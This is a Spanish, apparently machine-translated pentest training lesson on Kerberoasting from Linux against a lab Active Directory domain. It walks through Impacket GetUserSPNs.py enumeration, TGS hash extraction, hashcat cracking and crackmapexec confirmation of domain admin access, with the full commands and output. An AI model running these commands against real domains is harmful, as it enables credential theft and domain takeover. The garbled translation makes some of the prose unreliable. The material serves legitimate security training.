# Kerberoasting - de Linux

---

Nuestra enumeración hasta este punto nos ha dado una imagen amplia del dominio y los posibles problemas. Hemos enumerado cuentas de usuario y podemos ver que algunos están configurados con nombres principales del servicio. Veamos cómo podemos aprovechar esto para moverse lateralmente y aumentar los privilegios en el dominio objetivo.

---

## Descripción general de la kerberoasting

Kerberoasting es una técnica de escalada de movimiento/privilegio lateral en entornos de activo directorio. Este ataque se dirige[Servicio de nombres principales (SPN)](https://docs.microsoft.com/en-us/windows/win32/ad/service-principal-names)cuentas. Los SPN son identificadores únicos que Kerberos usa para asignar una instancia de servicio a una cuenta de servicio en cuyo contexto se ejecuta el servicio. Las cuentas de dominio a menudo se utilizan para ejecutar servicios para superar las limitaciones de autenticación de la red de las cuentas incorporadas, como`NT AUTHORITY\LOCAL SERVICE`. Cualquier usuario de dominio puede solicitar un boleto de Kerberos para cualquier cuenta de servicio en el mismo dominio. Esto también es posible entre los fideicomisos forestales si se permite la autenticación en el límite de confianza. Todo lo que necesita para realizar un ataque de Kerberoasting es la contraseña de ClearText de una cuenta (o hash NTLM), un shell en el contexto de una cuenta de usuario de dominio o acceso a nivel de sistema en un host unido por dominio.

Los servicios de ejecución de cuentas de dominio son a menudo administradores locales, si no cuentas de dominio altamente privilegiadas. Debido a la naturaleza distribuida de los sistemas, los servicios de interacción y las transferencias de datos asociadas, las cuentas de servicio pueden recibir privilegios de administrador en múltiples servidores en toda la empresa. Muchos servicios requieren privilegios elevados en varios sistemas, por lo que las cuentas de servicio a menudo se agregan a grupos privilegiados, como administradores de dominio, ya sea directamente o mediante membresía anidada. Encontrar SPN asociados con cuentas altamente privilegiadas en un entorno de Windows es muy común. Recuperar un boleto de Kerberos para una cuenta con un SPN no le permite ejecutar comandos en el contexto de esta cuenta. Sin embargo, el ticket (TGS-REP) está encriptado con el hash NTLM de la cuenta de servicio, por lo que la contraseña ClearText puede obtenerlo potencialmente sometiéndolo a un ataque con fuerza bruta fuera de línea con una herramienta como el hashcat.

Las cuentas de servicio a menudo se configuran con una contraseña débil o reutilizada para simplificar la administración, y a veces la contraseña es la misma que el nombre de usuario. Si la contraseña para una cuenta de servicio de SQL Server de dominio está descifrada, es probable que se encuentre como administrador local en múltiples servidores, si no administrador del dominio. Incluso si romper un boleto obtenido a través de un ataque de querberoasting ofrece una cuenta de usuario de bajo privilegio, podemos usarlo para crear boletos de servicio para el servicio especificado en el SPN. Por ejemplo, si el SPN se establece en MSSQL/SRV01, podemos acceder al servicio MSSQL como Sysadmin, habilite el procedimiento extendido XP_CMDSHELL y la ejecución del código de obtención en el servidor SQL de destino.

Para ver interesante el origen de esta técnica, consulte el[hablar](https://youtu.be/PUyhlN-E5MU)Tim Medin dio en Derbycon 2014, mostrando Kerberoasting al mundo.

---

## Kerberoasting - Realizando el ataque

Dependiendo de su posición en una red, este ataque se puede realizar de múltiples maneras:

- Desde un host de Linux unido a no dominio utilizando credenciales de usuario de dominio válidos.
- De un host de Linux unido por dominio como root después de recuperar el archivo KeyTab.
- Desde un host Windows unido por dominio autenticado como un usuario de dominio.
- De un host de Windows unido por dominio con un shell en el contexto de una cuenta de dominio.
- Como sistema en un host de Windows unido al dominio.
- De un host de Windows unido a un dominio usando[Runas](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771525\(v=ws.11\))/Netonly.

Se pueden utilizar varias herramientas para realizar el ataque:

- Municipio[GetUserspns.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py)De un no dominio se unió al host de Linux.
- Una combinación del setspn.exe Windows Binary, PowerShell y Mimikatz.
- Desde Windows, utilizando herramientas como PowerView,[Rubeo](https://github.com/GhostPack/Rubeus)y otros guiones de PowerShell.

Obtener un boleto TGS a través de Kerberoasting no le garantiza un conjunto de credenciales válidas, y el boleto aún debe ser`cracked`fuera de línea con una herramienta como hashcat para obtener la contraseña ClearText. Los boletos TGS tardan más en descifrar que otros formatos como los hashes NTLM, tan a menudo, a menos que se establezca una contraseña débil, puede ser difícil o imposible obtener el ClearText usando una plataforma de agrietamiento estándar.

---

## Eficacia del ataque

Si bien puede ser una excelente manera de moverse lateralmente o aumentar los privilegios en un dominio, la querberoasting y la presencia de SPN no nos garantizan ningún nivel de acceso. Podríamos estar en un entorno en el que desciframos un boleto TGS y obtenemos acceso de administrador de dominio de inmediato u obtenemos credenciales que nos ayuden a avanzar por el camino hacia el compromiso del dominio. Otras veces podemos realizar el ataque y recuperar muchos boletos de TGS, algunos de los cuales podemos descifrar, pero ninguno de los que se agrietan son para usuarios privilegiados, y el ataque no nos tiene acceso adicional. Probablemente escribiría el hallazgo como alto riesgo en mi informe en los dos primeros casos. En el tercer caso, podemos Kerberoast y terminar incapaces de descifrar un solo boleto TGS, incluso después de días de intentos de agrietamiento con hashcat en un poderoso equipo de agrietamiento de contraseña de GPU. En este escenario, todavía escribiría el hallazgo, pero lo dejaría a un problema de riesgo medio para que el cliente consciente del riesgo de SPN en el dominio (estas contraseñas seguras siempre podrían cambiarse a algo más débil o un atacante muy determinado que puede descifrar los tickets usando hashcat), pero tener en cuenta el hecho de que no pude tomar el control de ninguna cuentas dominantes utilizando el ataque. Es vital hacer este tipo de distinciones en nuestros informes y saber cuándo está bien reducir el riesgo de un hallazgo al mitigar los controles (como contraseñas muy seguras).

---

## Realizando el ataque

Los ataques de kerberoasting se realizan fácilmente ahora utilizando herramientas y scripts automatizados. Cubriremos realizando este ataque de varias maneras, tanto de un host de Attack Linux como de Windows. Primero pasemos por cómo hacer esto desde un host de Linux. La siguiente sección caminará a través de una forma "semi-manual" de realizar el ataque y dos ataques rápidos y automatizados utilizando herramientas comunes de código abierto, todas desde un host de ataque de Windows.

---

## Kerberoasting con getUserspns.py

Un requisito previo para realizar ataques de kerberoasting son las credenciales de usuario de dominio (ClearText o simplemente un hash NTLM si usa Impacket), un shell en el contexto de un usuario de dominio o una cuenta como el sistema. Una vez que tenemos este nivel de acceso, podemos comenzar. También debemos saber qué host del dominio es un controlador de dominio para que podamos consultarlo.

Comencemos por instalar el kit de herramientas de Impacket, del que podemos obtener[Aquí](https://github.com/SecureAuthCorp/impacket). Después de clonar el repositorio, podemos CD en el directorio e instalarlo de la siguiente manera:

#### Instalación de impactos utilizando PIP

  Kerberoasting - de Linux

```shell-session
xnoxos@htb[/htb]$ sudo python3 -m pip install .

Processing /opt/impacket
  Preparing metadata (setup.py) ... done
Requirement already satisfied: chardet in /usr/lib/python3/dist-packages (from impacket==0.9.25.dev1+20220208.122405.769c3196) (4.0.0)
Requirement already satisfied: flask>=1.0 in /usr/lib/python3/dist-packages (from impacket==0.9.25.dev1+20220208.122405.769c3196) (1.1.2)
Requirement already satisfied: future in /usr/lib/python3/dist-packages (from impacket==0.9.25.dev1+20220208.122405.769c3196) (0.18.2)
Requirement already satisfied: ldap3!=2.5.0,!=2.5.2,!=2.6,>=2.5 in /usr/lib/python3/dist-packages (from impacket==0.9.25.dev1+20220208.122405.769c3196) (2.8.1)
Requirement already satisfied: ldapdomaindump>=0.9.0 in /usr/lib/python3/dist-packages (from impacket==0.9.25.dev1+20220208.122405.769c3196) (0.9.3)

<SNIP>
```

Esto instalará todas las herramientas de consumo y las colocará en nuestro camino para que podamos llamarlas desde cualquier directorio en nuestro host de ataque. Impacket ya está instalado en el host de ataque que podemos generar al final de esta sección para seguir y trabajar a través de los ejercicios. Ejecutando la herramienta con el`-h`Flag sacará el menú de ayuda.

#### Listado GetUserspns.py Opciones de ayuda

  Kerberoasting - de Linux

```shell-session
xnoxos@htb[/htb]$ GetUserSPNs.py -h

Impacket v0.9.25.dev1+20220208.122405.769c3196 - Copyright 2021 SecureAuth Corporation

usage: GetUserSPNs.py [-h] [-target-domain TARGET_DOMAIN]
                      [-usersfile USERSFILE] [-request]
                      [-request-user username] [-save]
                      [-outputfile OUTPUTFILE] [-debug]
                      [-hashes LMHASH:NTHASH] [-no-pass] [-k]
                      [-aesKey hex key] [-dc-ip ip address]
                      target

Queries target domain for SPNs that are running under a user account

positional arguments:
  target                domain/username[:password]

<SNIP>
```

Podemos comenzar simplemente reuniendo una lista de SPN en el dominio. Para hacer esto, necesitaremos un conjunto de credenciales de dominio válidas y la dirección IP de un controlador de dominio. Podemos autenticarnos en el controlador de dominio con una contraseña ClearText, NT Password Hash o incluso un boleto Kerberos. Para nuestros propósitos, usaremos una contraseña. Ingresar el siguiente comando generará un aviso de credencial y luego una lista bien formateada de todas las cuentas SPN. De la siguiente salida, podemos ver que varias cuentas son miembros del Grupo de Administradores de Dominio. Si podemos recuperar y descifrar uno de estos boletos, podría conducir al compromiso del dominio. Siempre vale la pena investigar la membresía del grupo de todas las cuentas porque podemos encontrar una cuenta con un boleto fácil de criar que puede ayudarnos a promover nuestro objetivo de moverse lateralmente/verticalmente en el dominio objetivo.

#### Listado de cuentas SPN con getUserspns.py

  Kerberoasting - de Linux

```shell-session
xnoxos@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend

Impacket v0.9.25.dev1+20220208.122405.769c3196 - Copyright 2021 SecureAuth Corporation

Password:
ServicePrincipalName                           Name               MemberOf                                                                                  PasswordLastSet             LastLogon  Delegation 
---------------------------------------------  -----------------  ----------------------------------------------------------------------------------------  --------------------------  ---------  ----------
backupjob/veam001.inlanefreight.local          BACKUPAGENT        CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:15:40.842452  <never>               
sts/inlanefreight.local                        SOLARWINDSMONITOR  CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:14:48.701834  <never>               
MSSQLSvc/SPSJDB.inlanefreight.local:1433       sqlprod            CN=Dev Accounts,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                        2022-02-15 17:09:46.326865  <never>               
MSSQLSvc/SQL-CL01-01inlanefreight.local:49351  sqlqa              CN=Dev Accounts,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                        2022-02-15 17:10:06.545598  <never>               
MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433  sqldev             CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:13:31.639334  <never>               
adfsconnect/azure01.inlanefreight.local        adfs               CN=ExchangeLegacyInterop,OU=Microsoft Exchange Security Groups,DC=INLANEFREIGHT,DC=LOCAL  2022-02-15 17:15:27.108079  <never> 
```

Ahora podemos extraer todos los boletos TGS para el procesamiento fuera de línea utilizando el`-request`bandera. Los tickets TGS se emitirán en un formato que se pueda proporcionar fácilmente a Hashcat o John the Ripper para los intentos de agrietamiento de contraseña fuera de línea.

#### Solicitando todos los boletos TGS

  Kerberoasting - de Linux

```shell-session
xnoxos@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request 

Impacket v0.9.25.dev1+20220208.122405.769c3196 - Copyright 2021 SecureAuth Corporation

Password:
ServicePrincipalName                           Name               MemberOf                                                                                  PasswordLastSet             LastLogon  Delegation 
---------------------------------------------  -----------------  ----------------------------------------------------------------------------------------  --------------------------  ---------  ----------
backupjob/veam001.inlanefreight.local          BACKUPAGENT        CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:15:40.842452  <never>               
sts/inlanefreight.local                        SOLARWINDSMONITOR  CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:14:48.701834  <never>               
MSSQLSvc/SPSJDB.inlanefreight.local:1433       sqlprod            CN=Dev Accounts,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                        2022-02-15 17:09:46.326865  <never>               
MSSQLSvc/SQL-CL01-01inlanefreight.local:49351  sqlqa              CN=Dev Accounts,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                        2022-02-15 17:10:06.545598  <never>               
MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433  sqldev             CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                       2022-02-15 17:13:31.639334  <never>               
adfsconnect/azure01.inlanefreight.local        adfs               CN=ExchangeLegacyInterop,OU=Microsoft Exchange Security Groups,DC=INLANEFREIGHT,DC=LOCAL  2022-02-15 17:15:27.108079  <never>               



$krb5tgs$23$*BACKUPAGENT$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/BACKUPAGENT*$790ae75fc53b0ace5daeb5795d21b8fe$
$krb5tgs$23$*SOLARWINDSMONITOR$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/SOLARWINDSMONITOR*$993de7a8296f2a3f2fa41badec4215e1$

<SNIP>
```

También podemos ser más específicos y solicitar solo el boleto TGS para una cuenta específica. Intentemos solicitar uno solo para el`sqldev`cuenta.

#### Solicitando un solo boleto TGS

  Kerberoasting - de Linux

```shell-session
xnoxos@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev

Impacket v0.9.25.dev1+20220208.122405.769c3196 - Copyright 2021 SecureAuth Corporation

Password:
ServicePrincipalName                           Name    MemberOf                                             PasswordLastSet             LastLogon  Delegation 
---------------------------------------------  ------  ---------------------------------------------------  --------------------------  ---------  ----------
MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433  sqldev  CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL  2022-02-15 17:13:31.639334  <never>               



$krb5tgs$23$*sqldev$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/sqldev*$4ce5b71188b357b26032321529762c8a$
```

Con este boleto en la mano, podríamos intentar descifrar la contraseña del usuario fuera de línea usando hashcat. Si tenemos éxito, podemos terminar con los derechos de administrador del dominio.

Para facilitar el agrietamiento fuera de línea, siempre es bueno usar el`-outputfile`Marcar para escribir los boletos TGS en un archivo que luego se puede ejecutar usando hashcat en nuestro sistema de ataque o moverse a una plataforma de agrietamiento GPU.

#### Guardar el ticket TGS en un archivo de salida

  Kerberoasting - de Linux

```shell-session
xnoxos@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs

Impacket v0.9.25.dev1+20220208.122405.769c3196 - Copyright 2021 SecureAuth Corporation

Password:
ServicePrincipalName                           Name    MemberOf                                             PasswordLastSet             LastLogon  Delegation 
---------------------------------------------  ------  ---------------------------------------------------  --------------------------  ---------  ----------
MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433  sqldev  CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL  2022-02-15 17:13:31.639334  <never>  
```

Aquí hemos escrito el boleto TGS para el`sqldev`usuario en un archivo nombrado`sqldev_tgs`. Ahora podemos intentar descifrar el boleto fuera de línea usando el modo hash hashcat`13100`.

#### Romper el boleto fuera de línea con hashcat

  Kerberoasting - de Linux

```shell-session
xnoxos@htb[/htb]$ hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt 

hashcat (v6.1.1) starting...

<SNIP>

$krb5tgs$23$*sqldev$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/sqldev*$81f3efb5827a05f6ca196990e67bf751$:database!
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: Kerberos 5, etype 23, TGS-REP
Hash.Target......: $krb5tgs$23$*sqldev$INLANEFREIGHT.LOCAL$INLANEFREIG...404c1f
Time.Started.....: Tue Feb 15 17:45:29 2022, (10 secs)
Time.Estimated...: Tue Feb 15 17:45:39 2022, (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   821.3 kH/s (11.88ms) @ Accel:64 Loops:1 Thr:64 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 8765440/14344386 (61.11%)
Rejected.........: 0/8765440 (0.00%)
Restore.Point....: 8749056/14344386 (60.99%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: davius07 -> darten170

Started: Tue Feb 15 17:44:49 2022
Stopped: Tue Feb 15 17:45:41 2022
```

![image](https://academy.hackthebox.com/storage/modules/143/hashcat_tgs.png)

Hemos descifrado con éxito la contraseña del usuario como`database!`. Como el último paso, podemos confirmar nuestro acceso y ver que de hecho tenemos derechos de administrador de dominio, ya que podemos autenticarnos en el DC Target en el dominio inlanefreight.local. A partir de aquí, podríamos realizar la explotación posterior y continuar enumerando el dominio para otros caminos hacia el compromiso y otras fallas y configuraciones erróneas notables.

#### Prueba de autenticación contra un controlador de dominio

  Kerberoasting - de Linux

```shell-session
xnoxos@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\sqldev:database! (Pwn3d!
```

---

## Más tostado

Ahora que hemos cubierto la kerberoasting de un host de ataque de Linux, pasaremos por el proceso desde un host de Windows. Podemos decidir realizar parte, o todas las pruebas de un host de Windows, nuestro cliente puede proporcionarnos un host de Windows para probar, o podemos comprometer un host y necesitamos usarlo como un punto de partida para más ataques. Independientemente de cómo estamos utilizando hosts de Windows durante nuestras evaluaciones, para seguir siendo versátiles, es esencial comprender cómo realizar tantos ataques como sea posible de los hosts de Linux y Windows, porque nunca sabemos lo que nos habremos lanzado de una evaluación a otra.